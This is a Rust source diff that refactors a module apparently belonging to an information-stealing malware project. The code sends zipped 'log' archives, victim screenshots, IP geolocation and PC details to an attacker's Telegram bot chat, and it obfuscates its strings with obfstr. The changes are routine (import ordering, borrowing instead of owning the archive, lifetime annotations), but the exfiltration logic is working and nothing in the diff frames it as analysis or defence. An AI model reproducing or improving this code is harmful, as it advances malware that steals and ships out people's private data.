@@ -8,11 +8,11 @@ use collector::{Collector, Device};
 use core::fmt::{Display, Error, Formatter};
 use derive_new::new;
 use indoc::formatdoc;
-use ipinfo::{unwrapped_ip_info, IpInfo};
+use ipinfo::{IpInfo, unwrapped_ip_info};
 use obfstr::obfstr as s;
 use requests::{
-    write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request,
-    RequestBuilder,
+    BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder, write_file_field,
+    write_text_field,
 };
 use utils::pc_info::PcInfo;
 use utils::{format_size, internal_code_to_flag};
@@ -31,11 +31,13 @@ const TELEGRAM_MAX_FILE_SIZE: usize = 2 * 1024 * 1024 * 1024;
 /// - Telegram has a file upload limit of 2 GB per file.
 #[derive(new, Clone)]
 pub struct TelegramBotSender {
+    #[new(into)]
     chat_id: Arc<str>,
+    #[new(into)]
     token: Arc<str>,
 }
 
-struct TelegramBlockDisplay<'a>(&'a CollectorBlock);
+struct TelegramBlockDisplay<'a>(&'a CollectorBlock<'a>);
 
 impl Display for TelegramBlockDisplay<'_> {
     fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
@@ -202,7 +204,7 @@ impl TelegramBotSender {
     fn send_as_file(
         &self,
         log_name: &str,
-        archive: Vec<u8>,
+        archive: &[u8],
         screenshot: Option<Vec<u8>>,
         caption: String,
         thumbnail: Option<String>,
@@ -232,7 +234,7 @@ impl TelegramBotSender {
         let media_json = media_group.to_string();
 
         write_text_field!(builder, "media" => &media_json);
-        write_file_field!(builder, "logfile", log_name => "application/zip", &archive);
+        write_file_field!(builder, "logfile", log_name => "application/zip", archive);
 
         self.send_request(s!("sendMediaGroup"), builder)?;
 
@@ -325,7 +327,7 @@ impl LogSender for TelegramBotSender {
         match content {
             LogContent::ZipArchive(archive) => self.send_as_file(
                 &name,
-                archive,
+                &archive,
                 collector.get_device().get_screenshot(),
                 caption,
                 thumbnail,
